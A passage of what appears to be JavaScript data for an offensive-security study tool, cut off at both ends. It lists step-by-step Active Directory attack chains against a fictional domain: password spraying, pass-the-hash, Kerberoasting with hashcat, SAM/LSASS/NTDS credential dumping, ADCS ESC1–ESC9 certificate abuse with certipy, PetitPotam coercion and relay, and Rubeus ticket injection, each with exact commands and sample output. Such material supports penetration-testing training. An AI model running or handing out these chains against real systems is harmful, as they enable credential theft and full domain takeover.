      lead: 'Each ACL edge in BloodHound maps to a specific multi-step exploitation chain: verify the writable edge, modify the target AD object over LDAP, and cash in the new privilege.',
      stages: [
        { key: 's1', label: '1. Audit Writable Edges', prereq: 'Valid Domain User' },
        { key: 's2', label: '2. Group & User Takeover', prereq: 'GenericAll / WriteProperty / ForceChangePassword' },
        { key: 's3', label: '3. Domain & Owner Escalation', prereq: 'WriteDacl / WriteOwner' }
      ]
    },
    'dump-secrets': {
      lead: 'Choose your credential-dumping pipeline based on where you hold administrative rights (Workstation vs Domain Controller) and whether you are operating remotely from Kali or on an interactive shell.',
      stages: [
        { key: 's1', label: '1. Remote Workstation (SAM/LSA/LSASS)', prereq: 'Local Admin on Host (Port 445)' },
        { key: 's2', label: '2. Domain Controller (NTDS / VSS)', prereq: 'Domain Admin or Backup Operators' },
        { key: 's3', label: '3. On-Target Foothold & Offline', prereq: 'Interactive Admin/SYSTEM Shell' }
      ]
    },
    'ad-path-manual': {
      lead: 'When BloodHound collection is blocked or you want surgical command-line path-finding, pick the lane matching your current vantage point.',
      stages: [
        { key: 's1', label: '1. Remote From Kali (LDAP / bloodyAD)', prereq: 'Domain User + Port 389' },
        { key: 's2', label: '2. On-Target PowerView (In-Memory)', prereq: 'Windows Foothold Shell' },
        { key: 's3', label: '3. Built-In Windows Tools (Zero Upload)', prereq: 'Windows Foothold Shell' }
      ]
    },
    'powerview-enum': {
      lead: 'PowerView turns an on-target PowerShell foothold into a full Active Directory query engine. Group your queries by objective or jump to the dedicated Goal Module.',
      stages: [
        { key: 's1', label: '1. Stage & Map Domain', prereq: 'PowerShell Foothold' },
        { key: 's2', label: '2. Users, Groups & SPNs', prereq: 'PowerView Loaded in Memory' },
        { key: 's3', label: '3. ACLs, Shares & Sessions', prereq: 'PowerView Loaded in Memory' }
      ]
    }
  };

  var STUDY_APPROACHES = {
    'nxc-arsenal': [
      {
        stage: 's1', label: 'Null & Guest Session Share / RID Sweep', toolsLabel: 'nxc smb (Null -> Guest)', locus: 'REMOTE',
        prereqNote: 'Needs: Target IP + Port 445 (Zero Credentials)',
        when: 'Opening move against any SMB host before you hold credentials. Checks if anonymous null bind or the built-in Guest account can list shares or brute-force domain RIDs.',
        deepLink: { id: 'recon-smb-anon', title: 'Anonymous / Guest SMB Recon' },
        steps: [
          { title: 'Step 1: Probe Null Session Shares & RID Cycling', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u '' -p '' --shares --rid-brute", out: "SMB  10.10.10.10  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:acme.internal)\nSMB  10.10.10.10  445  DC01  [+] acme.internal\\:\nSMB  10.10.10.10  445  DC01  498: ACME\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB  10.10.10.10  445  DC01  1104: ACME\\jbloggs (SidTypeUser)\nSMB  10.10.10.10  445  DC01  1105: ACME\\svc_sql (SidTypeUser)", sig: 'SidTypeUser', teach: 'RID cycling over a null session leaks every domain username without needing a login.' },
          { title: 'Step 2: Probe Guest Account Share Access', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u 'guest' -p '' --shares", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\guest: (Guest)\nSMB  10.10.10.10  445  DC01  Share           Permissions     Remark\nSMB  10.10.10.10  445  DC01  -----           -----------     ------\nSMB  10.10.10.10  445  DC01  IPC$            READ            Remote IPC\nSMB  10.10.10.10  445  DC01  Public          READ            Company Public Drop", sig: 'READ', teach: 'Non-default shares with READ permission (like Public) are prime targets for spidering.' }
        ]
      },
      {
        stage: 's2', label: 'Multi-User Password Spray & Protocol Sweep', toolsLabel: 'nxc smb -> nxc winrm', locus: 'REMOTE',
        prereqNote: 'Needs: Userlist + Candidate Password',
        when: 'Use once you have a username list and a candidate password (from a share, description field, or cracked hash). Validates credentials across SMB and checks if WinRM (5985) grants shell access.',
        deepLink: { id: 'password-spray', title: 'Password Spraying' },
        steps: [
          { title: 'Step 1: Spray One Password Across Userlist', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success", out: "SMB  10.10.10.10  445  DC01  [-] acme.internal\\administrator:Autumn2026! STATUS_LOGON_FAILURE\nSMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!", sig: '[+] acme.internal\\jbloggs:Autumn2026!', teach: 'A [+] line confirms a valid domain credential; add (Pwn3d!) if that account holds local admin.' },
          { title: 'Step 2: Check WinRM Shell Access with Valid Cred', tool: 'nxc', where: 'local', run: "nxc winrm 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "WINRM  10.10.10.10  5985  DC01  [+] acme.internal\\jbloggs:Autumn2026! (Pwn3d!)", sig: '(Pwn3d!)', teach: '(Pwn3d!) on WinRM means jbloggs is in Remote Management Users or Administrators and can open an interactive evil-winrm shell.' }
        ]
      },
      {
        stage: 's2', label: 'Pass-the-Hash Sweep (-H)', toolsLabel: 'nxc smb -H', locus: 'REMOTE',
        prereqNote: 'Needs: Username + NTLM Hash',
        when: 'Use when you dumped an NTLM hash (from SAM, LSASS, or Certipy PKINIT) and want to authenticate without cracking the plaintext password.',
        deepLink: { id: 'pass-the-hash', title: 'Pass-the-Hash (PtH)' },
        steps: [
          { title: 'Step 1: Validate NT Hash Against Domain or Local SAM', tool: 'nxc', where: 'local', run: 'nxc smb 10.10.10.10 -u jbloggs -H 8846f7eaee8fb117ad06bdd830b7586c', out: 'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)', sig: '(Pwn3d!)', teach: 'Passing the raw NTLM hash authenticates directly over SMB; add --local-auth when testing a local SAM hash across workstations.' }
        ]
      },
      {
        stage: 's3', label: 'One-Shot Domain Recon (Shares, Groups & Policy)', toolsLabel: 'nxc smb (--shares --pass-pol)', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User',
        when: 'Your first command after earning a low-privileged domain credential. Pulls readable shares, local group memberships, and the domain lockout threshold in a single pass.',
        deepLink: { id: 'domain-policy-enum', title: 'Domain Password Policy' },
        steps: [
          { title: 'Step 1: Enumerate Shares, Groups & Lockout Policy', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares --local-groups --pass-pol", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!\nSMB  10.10.10.10  445  DC01  Share           Permissions     Remark\nSMB  10.10.10.10  445  DC01  SYSVOL          READ            Logon server share\nSMB  10.10.10.10  445  DC01  Department      READ,WRITE      Internal Ops\nSMB  10.10.10.10  445  DC01  [+] Dumping password info for domain: ACME\nSMB  10.10.10.10  445  DC01  Account Lockout Threshold: 5", sig: 'Account Lockout Threshold', teach: 'Always check Account Lockout Threshold before running any password spray so you never lock domain accounts.' }
        ]
      },
      {
        stage: 's3', label: 'Spider Readable Shares for Loot (-M spider_plus)', toolsLabel: 'nxc smb -M spider_plus -> jq', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Readable Share',
        when: 'Instead of manually browsing dozens of nested SMB folders, spider_plus builds a complete JSON index of every readable file across all shares.',
        deepLink: { id: 'spider-secrets', title: 'Spider Shares for Secrets' },
        steps: [
          { title: 'Step 1: Run spider_plus Across Readable Shares', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M spider_plus", out: "SMB         10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!\nSPIDER_PLUS 10.10.10.10  445  DC01  [*] Saved share-file metadata to \"/tmp/nxc_hosted/nxc_spider_plus/10.10.10.10.json\"", sig: '10.10.10.10.json', teach: 'spider_plus writes the full directory tree of every readable share to a local JSON file.' },
          { title: 'Step 2: Inspect the Spider JSON for Configs, Scripts & Backups', tool: 'jq', where: 'local', run: 'cat /tmp/nxc_hosted/nxc_spider_plus/10.10.10.10.json | grep -iE "pass|config|backup|kdbx|xml|ps1|txt"', out: '    "Department/IT/deploy_creds.ps1": {\n    "Department/Backups/web.config": {', sig: 'deploy_creds.ps1', teach: 'Look for scripts (.ps1, .bat), configs (web.config, .env, .xml), and KeePass databases (.kdbx) to pull with smbclient.' }
        ]
      },
      {
        stage: 's3', label: 'LDAP AS-REP & Kerberoast Sweep', toolsLabel: 'nxc ldap -> hashcat', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 389/88',
        when: 'Roasts both pre-auth disabled accounts (AS-REP) and service accounts with SPNs (Kerberoast) directly through NetExec LDAP without needing separate Impacket scripts.',
        deepLink: { id: 'kerberoast', title: 'Kerberoasting' },
        steps: [
          { title: 'Step 1: Roast AS-REP & Kerberoast Hashes via LDAP', tool: 'nxc', where: 'local', run: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --asreproast asrep.hash --kerberoasting tgs.hash", out: "LDAP  10.10.10.10  389  DC01  [+] acme.internal\\jbloggs:Autumn2026!\nLDAP  10.10.10.10  389  DC01  $krb5tgs$23$*svc_sql$ACME.INTERNAL$acme.internal/svc_sql*$b83a91c04f11...", sig: '$krb5tgs$23$', teach: 'NetExec writes captured hashes directly in Hashcat format (-m 18200 for AS-REP, -m 13100 for Kerberoast).' },
          { title: 'Step 2: Crack Captured Service Ticket Offline', tool: 'hashcat', where: 'local', run: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --quiet', out: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$acme.internal/svc_sql*$b83a91c04f11...:SqlServer2024!', sig: 'SqlServer2024!', teach: 'Cracking the service account password offline triggers zero failed-logon events on the Domain Controller.' }
        ]
      },
      {
        stage: 's4', label: 'Local Admin Credential Dump (--sam --lsa -M lsassy)', toolsLabel: 'nxc smb (--sam --lsa -M lsassy)', locus: 'REMOTE',
        prereqNote: 'Needs: Local Admin on Target (Pwn3d!)',
        when: 'Once you see (Pwn3d!) on a workstation or member server, dump its local SAM hashes, LSA service secrets, and live LSASS memory remotely from Kali.',
        deepLink: { id: 'dump-secrets', title: 'Credential Dumping (SAM / LSA / NTDS)' },
        steps: [
          { title: 'Step 1: Dump Local SAM Hashes & LSA Secrets', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.20 -u svc_sql -p 'SqlServer2024!' --sam --lsa", out: "SMB  10.10.10.20  445  SQL01  [+] acme.internal\\svc_sql:SqlServer2024! (Pwn3d!)\nSMB  10.10.10.20  445  SQL01  [+] Dumping SAM hashes\nSMB  10.10.10.20  445  SQL01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", sig: 'Administrator:500:', teach: 'The local Administrator NTLM hash (RID 500) can immediately be sprayed across other workstations with --local-auth.' },
          { title: 'Step 2: Extract Live Domain Logons from LSASS Memory (-M lsassy)', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.20 -u svc_sql -p 'SqlServer2024!' -M lsassy", out: "LSASSY  10.10.10.20  445  SQL01  acme.internal\\adm_bob  NT: 58a478135a93ac3bf058a5ea0e8fdb71", sig: 'acme.internal\\adm_bob', teach: 'lsassy extracts credentials of domain admins currently logged into the server in memory.' }
        ]
      },
      {
        stage: 's4', label: 'Domain Controller NTDS.dit & Command Exec', toolsLabel: 'nxc smb --ntds / nxc winrm -x', locus: 'REMOTE',
        prereqNote: 'Needs: Domain Admin (Pwn3d! on DC)',
        when: 'When you hold Domain Admin credentials against the Domain Controller, dump the full Active Directory NTDS.dit database or execute commands directly.',
        deepLink: { id: 'dcsync', title: 'DCSync (Domain Hash Dump)' },
        steps: [
          { title: 'Step 1: Dump NTDS.dit via DRSUAPI (--ntds)', tool: 'nxc', where: 'local', run: 'nxc smb 10.10.10.10 -u adm_bob -H 58a478135a93ac3bf058a5ea0e8fdb71 --ntds', out: 'SMB  10.10.10.10  445  DC01  [+] acme.internal\\adm_bob:58a478135a93ac3bf058a5ea0e8fdb71 (Pwn3d!)\nSMB  10.10.10.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:92b8147a03c6201f9a02109c9b2e0a51:::\nSMB  10.10.10.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1f92a38c44e01b8902ab10c92f811d2a:::', sig: 'krbtgt:502:', teach: 'Dumping Administrator and krbtgt from NTDS.dit completes full domain compromise.' }
        ]
      }
    ],
    'adcs-esc': [
      {
        stage: 's1', label: 'Step 0: Enumerate CAs & Vulnerable Templates', toolsLabel: 'certipy find -> nxc -M adcs', locus: 'REMOTE',
        prereqNote: 'Needs: Any Valid Domain User + Port 389/445',
        when: 'Always start here. Queries LDAP and RPC to list every Certificate Authority, enrollment endpoint, and template ACL, flagging ESC1 through ESC11 automatically.',
        deepLink: { id: 'certipy-find', title: 'Enumerate AD CS Templates (certipy find)' },
        steps: [
          { title: 'Step 1: Run Certipy Vulnerability Audit', tool: 'certipy', where: 'local', run: "certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable -stdout", out: "Certificate Authorities\n  0\n    CA Name                             : acme-DC01-CA\n    DNS Name                            : DC01.acme.internal\n    Web Enrollment                      : Enabled\nCertificate Templates\n  0\n    Template Name                       : UserCert\n    Client Authentication               : True\n    Enrollee Supplies Subject           : True\n    [!] Vulnerabilities\n      ESC1                              : 'ACME.INTERNAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication", sig: 'ESC1', teach: 'Certipy prints the exact ESC number, the CA Name, the Template Name, and which group holds enrollment or write rights.' }
        ]
      },
      {
        stage: 's2', label: 'ESC1 Full Chain: Enrollee Supplies Subject', toolsLabel: 'certipy find -> certipy req -> certipy auth', locus: 'REMOTE',
        prereqNote: 'Needs: Enroll Rights + EnrolleeSuppliesSubject + ClientAuth',
        when: 'Use when certipy find flags ESC1. Because the template lets the enrollee specify an arbitrary Subject Alternative Name (UPN), any low-privileged user can request a certificate as Administrator.',
        deepLink: { id: 'cert-authenticate', title: 'Authenticate with a Certificate (PKINIT)' },
        steps: [
          { title: 'Step 1: Request Certificate with Administrator UPN (-upn)', tool: 'certipy', where: 'local', run: "certipy req -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -template UserCert -upn administrator@acme.internal", out: "Certipy v4.8.2 - by Oliver Lyak (ly4k)\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Got certificate with UPN 'administrator@acme.internal'\n[*] Saving certificate and private key to 'administrator.pfx'", sig: "Saving certificate and private key to 'administrator.pfx'", teach: 'The CA signs a valid Client Authentication certificate embedding administrator@acme.internal in the SAN.' },
          { title: 'Step 2: Authenticate via PKINIT & Extract Administrator NT Hash', tool: 'certipy', where: 'local', run: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10', out: "[*] Using principal: administrator@acme.internal\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@acme.internal': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", sig: 'Got hash for', teach: 'certipy auth exchanges the PFX for a Kerberos TGT and performs U2U to recover the account\'s permanent NTLM hash.' }
        ]
      },
      {
        stage: 's2', label: 'ESC3 Full Chain: Enrollment Agent On-Behalf-Of', toolsLabel: 'certipy req (Agent) -> certipy req (-on-behalf-of) -> certipy auth', locus: 'REMOTE',
        prereqNote: 'Needs: Certificate Request Agent EKU Template',
        when: 'Use when a template grants the Certificate Request Agent EKU (ESC3). First enroll for an Enrollment Agent certificate, then use that PFX to request a standard User certificate on behalf of Administrator.',
        steps: [
          { title: 'Step 1: Request Enrollment Agent Certificate', tool: 'certipy', where: 'local', run: "certipy req -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -template EnrollmentAgent", out: "[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Saving certificate and private key to 'jbloggs.pfx'", sig: "Saving certificate and private key to 'jbloggs.pfx'", teach: 'jbloggs.pfx carries the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1).' },
          { title: 'Step 2: Request User Certificate On-Behalf-Of Administrator', tool: 'certipy', where: 'local', run: "certipy req -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -template User -on-behalf-of 'acme\\Administrator' -pfx jbloggs.pfx", out: "[*] Requesting certificate on behalf of 'acme\\Administrator'\n[*] Successfully requested certificate\n[*] Saving certificate and private key to 'administrator.pfx'", sig: "Saving certificate and private key to 'administrator.pfx'", teach: 'Note that -on-behalf-of requires NetBIOS domain\\username format (e.g. acme\\Administrator), not UPN.' },
          { title: 'Step 3: Authenticate with Administrator PFX', tool: 'certipy', where: 'local', run: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10', out: "[*] Got TGT\n[*] Got hash for 'administrator@acme.internal': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", sig: 'Got hash for', teach: 'Pass the recovered Administrator NT hash straight to secretsdump or evil-winrm.' }
        ]
      },
      {
        stage: 's3', label: 'ESC4 Full Chain: Writable Template ACL (Overwrite -> Enroll -> Restore)', toolsLabel: 'certipy template -> certipy req -> certipy template -> certipy auth', locus: 'REMOTE',
        prereqNote: 'Needs: GenericWrite / WriteDacl / WriteProperty on Template',
        when: 'Use when your account or group holds write permissions over a certificate template (ESC4). Overwrite the template configuration to enable ESC1, request the Admin cert, and restore the original JSON configuration.',
        deepLink: { id: 'adcs-esc4-template', title: 'ESC4 Template ACL Abuse' },
        steps: [
          { title: 'Step 1: Backup & Overwrite Template to Enable ESC1 (-save-old)', tool: 'certipy', where: 'local', run: "certipy template -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -template CorpVPN -save-old", out: "[*] Saved old configuration for 'CorpVPN' to 'CorpVPN.json'\n[*] Updating certificate template 'CorpVPN'\n[*] Successfully updated 'CorpVPN'", sig: "Successfully updated 'CorpVPN'", teach: '-save-old backs up the original template attributes to CorpVPN.json before turning on EnrolleeSuppliesSubject.' },
          { title: 'Step 2: Request Administrator Certificate Against Modified Template', tool: 'certipy', where: 'local', run: "certipy req -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -template CorpVPN -upn administrator@acme.internal", out: "[*] Successfully requested certificate\n[*] Saving certificate and private key to 'administrator.pfx'", sig: "Saving certificate and private key to 'administrator.pfx'", teach: 'With ESC1 now active on CorpVPN, request the Administrator PFX.' },
          { title: 'Step 3: Restore Original Template Configuration & Authenticate', tool: 'certipy', where: 'local', run: "certipy template -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -template CorpVPN -configuration CorpVPN.json && certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10", out: "[*] Successfully updated 'CorpVPN'\n[*] Got hash for 'administrator@acme.internal': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", sig: 'Got hash for', teach: 'Always restore CorpVPN.json immediately so the template returns to its clean pre-engagement state.' }
        ]
      },
      {
        stage: 's3', label: 'ESC7 Full Chain: ManageCA Officer Approval Flow', toolsLabel: 'certipy ca (-add-officer -> -enable-template) -> certipy req -> certipy ca (-issue-request)', locus: 'REMOTE',
        prereqNote: 'Needs: ManageCA or ManageCertificates on the CA Server',
        when: 'Use when your user has ManageCA rights on the Certificate Authority itself (ESC7). Grant yourself Certificate Officer rights, enable the built-in SubCA template, submit a request (which pend/denies), approve the request ID as Officer, and retrieve the signed Admin PFX.',
        steps: [
          { title: 'Step 1: Add Self as CA Officer & Enable SubCA Template', tool: 'certipy', where: 'local', run: "certipy ca -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -add-officer jbloggs && certipy ca -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -enable-template SubCA", out: "[*] Successfully added officer 'jbloggs' on 'acme-DC01-CA'\n[*] Successfully enabled 'SubCA' on 'acme-DC01-CA'", sig: "Successfully enabled 'SubCA'", teach: 'ManageCA lets you promote yourself to Certificate Officer and enable the privileged SubCA template.' },
          { title: 'Step 2: Request SubCA Certificate (Capture Request ID)', tool: 'certipy', where: 'local', run: "certipy req -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -template SubCA -upn administrator@acme.internal", out: "[*] Request ID is 24\n[-] Got error while trying to request certificate: CERTSRV_E_TEMPLATE_DENIED\n[*] Saving private key to '24.key'", sig: 'Request ID is 24', teach: 'Even when SubCA denies enrollment, the CA logs the pending/failed Request ID (24) and Certipy saves the matching private key.' },
          { title: 'Step 3: Approve Request ID as Officer & Retrieve Signed PFX', tool: 'certipy', where: 'local', run: "certipy ca -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -issue-request 24 && certipy req -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -ca acme-DC01-CA -retrieve 24", out: "[*] Successfully issued certificate\n[*] Saving certificate and private key to 'administrator.pfx'", sig: "Saving certificate and private key to 'administrator.pfx'", teach: 'certipy req -retrieve merges the issued certificate with 24.key into a ready-to-use administrator.pfx.' }
        ]
      },
      {
        stage: 's4', label: 'ESC8 Full Chain: HTTP Web Enrollment Coercion + Relay', toolsLabel: 'certipy relay + PetitPotam.py -> certipy auth', locus: 'REMOTE',
        prereqNote: 'Needs: HTTP /certsrv/ Enabled + Coercible Host (e.g. DC01$)',
        when: 'Use when certipy find shows Web Enrollment enabled over HTTP (ESC8). Stand up certipy relay targeting the DomainController template, then coerce the DC machine account with PetitPotam or Coercer.',
        deepLink: { id: 'adcs-esc8-relay', title: 'ESC8 HTTP Web Enrollment Relay' },
        steps: [
          { title: 'Step 1: Start Certipy NTLM Relay Listener Targeting CA HTTP Endpoint', tool: 'certipy', where: 'local', run: 'certipy relay -target http://10.10.10.25/certsrv/certfnsh.asp -template DomainController', out: "[*] Targeting http://10.10.10.25/certsrv/certfnsh.asp (ESC8)\n[*] Listening on 0.0.0.0:445", sig: 'Listening on 0.0.0.0:445', teach: 'Keep this listener running in Terminal 1 while you trigger authentication coercion in Terminal 2.' },
          { title: 'Step 2: Coerce DC01$ Machine Authentication with PetitPotam', tool: 'PetitPotam.py', where: 'local', run: "python3 PetitPotam.py -d acme.internal -u jbloggs -p 'Autumn2026!' 10.10.14.5 10.10.10.10", out: "Trying pipe lsarpc\n[+] Attack worked!\n[*] Got certificate for 'DC01$@acme.internal'\n[*] Saving certificate and private key to 'dc01.pfx'", sig: "Saving certificate and private key to 'dc01.pfx'", teach: 'Relaying DC01$ into the DomainController template mints dc01.pfx, which holds full DCSync replication rights.' },
          { title: 'Step 3: Authenticate as DC01$ & Extract Machine Account Hash', tool: 'certipy', where: 'local', run: 'certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10', out: "[*] Got hash for 'dc01$@acme.internal': aad3b435b51404eeaad3b435b51404ee:e49a1209c8810b51a3910f281b0192ac", sig: 'Got hash for', teach: 'With dc01$\'s NTLM hash, run impacket-secretsdump acme.internal/dc01$@10.10.10.10 -hashes ... -just-dc to dump the domain.' }
        ]
      },
      {
        stage: 's4', label: 'ESC9 / ESC10 Full Chain: GenericWrite UPN Manipulation', toolsLabel: 'certipy account update -> certipy req -> certipy account update -> certipy auth', locus: 'REMOTE',
        prereqNote: 'Needs: GenericWrite over Victim User + Weak Certificate Mapping',
        when: 'Use when you control a victim account (GenericWrite) and the CA has weak certificate binding (ESC9/ESC10). Temporarily rename the victim\'s UPN to Administrator, enroll a cert as the victim, revert the UPN immediately, and authenticate.',
        steps: [
          { title: 'Step 1: Temporarily Set Victim UPN to Administrator', tool: 'certipy', where: 'local', run: "certipy account update -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -user svc_help -upn Administrator", out: "[*] Updating user 'svc_help':\n    userPrincipalName: Administrator\n[*] Successfully updated 'svc_help'", sig: "Successfully updated 'svc_help'", teach: 'While svc_help\'s UPN is Administrator, any certificate enrolled by svc_help will carry UPN=Administrator.' },
          { title: 'Step 2: Request Certificate as Victim & Immediately Restore UPN', tool: 'certipy', where: 'local', run: "certipy req -u svc_help@acme.internal -hashes :8846f7eaee8fb117ad06bdd830b7586c -dc-ip 10.10.10.10 -ca acme-DC01-CA -template User && certipy account update -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -user svc_help -upn svc_help@acme.internal", out: "[*] Saving certificate and private key to 'administrator.pfx'\n[*] Successfully updated 'svc_help'", sig: "Saving certificate and private key to 'administrator.pfx'", teach: 'Reverting svc_help\'s UPN ensures the KDC maps UPN=Administrator back to the real Domain Administrator account during PKINIT!' }
        ]
      },
      {
        stage: 's4', label: 'On-Target Windows Foothold: Certify.exe -> Rubeus PKINIT', toolsLabel: 'Certify.exe -> Rubeus.exe', locus: 'ON-TARGET',
        prereqNote: 'Needs: Interactive Windows Foothold Shell (.NET 4.x)',
        when: 'Use when you are operating inside a Windows foothold shell without SOCKS/proxychains back to Kali. Certify.exe enumerates and requests the certificate on-box, and Rubeus performs PKINIT to inject the Administrator TGT directly into your session.',
        steps: [
          { title: 'Step 1: Find Vulnerable Templates On-Box with Certify.exe', tool: 'Certify.exe', where: 'host', run: '.\\Certify.exe find /vulnerable', out: "CA Name                         : DC01.acme.internal\\acme-DC01-CA\nTemplate Name                   : UserCert\nmsPKI-Certificate-Name-Flag     : ENROLLEE_SUPPLIES_SUBJECT", sig: 'ENROLLEE_SUPPLIES_SUBJECT', teach: 'ENROLLEE_SUPPLIES_SUBJECT with Client Authentication EKU and Domain Users Enroll rights confirms ESC1 from the host.' },
          { title: 'Step 2: Request Certificate & Inject Admin TGT with Rubeus', tool: 'Rubeus.exe', where: 'host', run: '.\\Certify.exe request /ca:DC01.acme.internal\\acme-DC01-CA /template:UserCert /altname:Administrator && .\\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt /getcredentials', out: "[+] Ticket successfully imported!\n[*] Getting credentials using U2U\n  NTLM              : 31d6cfe0d16ae931b73c59d7e0c089c0", sig: 'Ticket successfully imported!', teach: '/ptt imports the Administrator TGT into your current logon session and /getcredentials extracts the NTLM hash via U2U.' }
        ]
      }
    ],
    'kerberoast': [
      {
        label: 'NetExec LDAP Roast -> Hashcat 13100 (Fastest Remote Pipeline)', toolsLabel: 'nxc ldap -> hashcat', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 389/88',
        when: 'Default remote pipeline from Kali. NetExec queries LDAP for every user account with a servicePrincipalName, requests their TGS tickets, and saves them ready for Hashcat mode 13100.',
        steps: [
          { title: 'Step 1: Request All SPN TGS Tickets via NetExec LDAP', tool: 'nxc', where: 'local', run: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash", out: "LDAP  10.10.10.10  389  DC01  [+] acme.internal\\jbloggs:Autumn2026!\nLDAP  10.10.10.10  389  DC01  sAMAccountName: svc_sql memberOf: CN=Domain Admins,CN=Users,DC=acme,DC=internal\nLDAP  10.10.10.10  389  DC01  $krb5tgs$23$*svc_sql$ACME.INTERNAL$acme.internal/svc_sql*$b83a91c04f11...", sig: '$krb5tgs$23$', teach: '$krb5tgs$23$ indicates an RC4-HMAC encrypted service ticket (the fastest encryption type to crack).' },
          { title: 'Step 2: Crack Kerberoast Ticket Offline with Hashcat (-m 13100)', tool: 'hashcat', where: 'local', run: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --quiet', out: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$acme.internal/svc_sql*$b83a91c04f11...:SqlServer2024!', sig: 'SqlServer2024!', teach: 'Once cracked, test the service account password across SMB, WinRM, and MSSQL.' }
        ]
      },
      {
        label: 'Impacket GetUserSPNs Pipeline (Inspect SPNs -> Request -> Crack)', toolsLabel: 'impacket-GetUserSPNs -> hashcat', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 88/389',
        when: 'Use when you want to inspect PasswordLastSet and SPN names first so you can target human-created service accounts (rather than auto-rotated computer/gMSA accounts) or pass a Kerberos TGT (-k -no-pass).',
        steps: [
          { title: 'Step 1: List SPN Accounts & Password Ages', tool: 'impacket-GetUserSPNs', where: 'local', run: "impacket-GetUserSPNs 'acme.internal/jbloggs:Autumn2026!' -dc-ip 10.10.10.10", out: "ServicePrincipalName          Name     MemberOf                                       PasswordLastSet             LastLogon\n----------------------------  -------  ---------------------------------------------  --------------------------  ---------\nMSSQLSvc/sql01.acme.internal  svc_sql  CN=Domain Admins,CN=Users,DC=acme,DC=internal  2024-03-14 09:12:41.102931  <never>", sig: 'MSSQLSvc/sql01.acme.internal', teach: 'Prioritize accounts with older PasswordLastSet dates and high-value MemberOf groups.' },
          { title: 'Step 2: Request TGS Tickets to File (-request -outputfile)', tool: 'impacket-GetUserSPNs', where: 'local', run: "impacket-GetUserSPNs 'acme.internal/jbloggs:Autumn2026!' -dc-ip 10.10.10.10 -request -outputfile tgs.hash", out: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/sql01.acme.internal*$b83a91c04f11...', sig: '$krb5tgs$23$', teach: 'Saves all requested TGS tickets to tgs.hash for Hashcat (-m 13100) or John (--format=krb5tgs).' }
        ]
      },
      {
        label: 'Targeted Kerberoast (ACL SPN Write -> Roast -> Crack)', toolsLabel: 'targetedKerberoast.py / bloodyAD -> hashcat', locus: 'REMOTE',
